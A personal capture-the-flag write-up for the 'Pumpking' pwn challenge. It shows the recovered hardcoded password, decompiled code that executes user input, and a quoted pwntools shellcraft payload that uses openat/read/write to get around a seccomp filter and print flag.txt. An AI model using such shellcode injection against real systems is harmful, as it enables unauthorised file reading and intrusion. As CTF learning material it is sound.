# Pumpking

## The Problem

Rating: easy

Flavor Text:
```
Long live the King! Pumpking is the king of our hometown and this time of the year, he makes wishes come true! But, you must be naughty in order to get a wish.. He is like reverse Santa Claus and way cooler!
```

Attachments : [pwn_pumpking.zip](./pwn_pumpking.zip)



## Solution

https://github.com/D13David/ctf-writeups/blob/main/hacktheboo22/Day%203/pumpking/README.md



step one get past the entry password

string pumpking nets you:
pumpk1ngRulez

open it up on binaryninja to confirm:
```
  iVar1 = strncmp((char *)&local_1f,"pumpk1ngRulez",0xd);
  if (iVar1 == 0) {
    king();
  }
```
pumpk1ngRulez is the password input

next it looks to read in input and execute it?


```
  write(1,
        "\n[Pumpkgin]: Welcome naughty kid! This time of the year, I will make your wish come true!  Wish for everything, even for tha flag!\n\n>> "
        ,0x88);
  local_a8 = 0;
  local_a0 = 0;
  local_98 = 0;
  local_90 = 0;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_14 = 0;
  read(0,&input,0x95);
  (*(code *)&input)();
```
I spent a good while trying various shell code inputs but they dont seem to work. 


Post event [writeups](https://github.com/D13David/ctf-writeups/blob/main/hacktheboo22/Day%203/pumpking/README.md) revealed the secomp rules are limiting the syscalls to a few particular calls. 

I had tryed shell codes and those fail for good reason. but the printing of the flag.txt file looks to have failed because the open didnt work. the proper sollution seems to be openat not open

one interesting way to get to this is using shellcraft to generate the payload?

from: https://github.com/D13David/ctf-writeups/blob/main/hacktheboo22/Day%203/pumpking/README.md
```
payload = shellcraft.openat(-100, "flag.txt") # handler value -100 opens file relative to executable
payload += shellcraft.read('rax', 'rsp', 50)
payload += shellcraft.write(1, 'rsp', 50)
payload += shellcraft.exit(0)
p.sendlineafter(b">> ", asm(payload))
p.interactive()
```


## Flag
```

```

## Final Notes
